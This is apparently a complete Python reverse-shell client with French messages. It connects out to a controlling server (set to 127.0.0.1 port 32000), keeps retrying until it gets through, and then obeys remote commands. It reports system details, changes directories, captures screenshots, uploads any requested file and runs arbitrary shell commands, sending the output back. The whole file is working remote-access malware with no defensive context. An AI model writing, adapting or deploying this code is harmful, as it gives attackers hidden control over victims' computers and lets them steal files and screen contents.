import socket
import time
import subprocess
import os
import platform
import pyscreenshot as ImageGrab

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")
while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print("ERREUR : impossible de se connecter au serveur. Reconnexion...")
        time.sleep(4)
    else:
        print("Connecté au serveur")
        break

while True:
    commande_data = s.recv(MAX_DATA_SIZE)
    if not commande_data:
        break
    commande = commande_data.decode().strip()
    print("Commande : ", commande)

    commande_split = commande.split(" ")

    if commande == "infos":
        reponse_encodee = (platform.platform() + "|" + os.getcwd() + "\n").encode()

    elif len(commande_split) == 2 and commande_split[0] == "cd":
        try:
            os.chdir(commande_split[1].strip("'"))
            reponse_encodee = f"Répertoire changé : {os.getcwd()}\n".encode()
        except FileNotFoundError:
            reponse_encodee = "ERREUR : ce répertoire n'existe pas\n".encode()

    elif len(commande_split) == 2 and commande_split[0] == "capture":
        capture_filename = "/tmp/" + commande_split[1] + ".png"
        capture_ecran = ImageGrab.grab()
        capture_ecran.save(capture_filename, "PNG")
        try:
            with open(capture_filename, "rb") as f:
                reponse_encodee = f.read()
        except FileNotFoundError:
            reponse_encodee = "ERREUR : capture d'écran non trouvée\n".encode()

    elif len(commande_split) == 2 and commande_split[0] == "dl":
        try:
            with open(commande_split[1], "rb") as f:
                reponse_encodee = f.read()
        except FileNotFoundError:
            reponse_encodee = "ERREUR : fichier non trouvé\n".encode()

    else:
        resultat = subprocess.run(commande, shell=True, capture_output=True,
            universal_newlines=True)
        reponse = resultat.stdout + resultat.stderr
        if not reponse:
            reponse = "Aucune sortie pour cette commande\n"
        reponse_encodee = reponse.encode()

    header = str(len(reponse_encodee)).zfill(13)
    print("header:", header)
    s.sendall(header.encode())
    s.sendall(reponse_encodee)

s.close()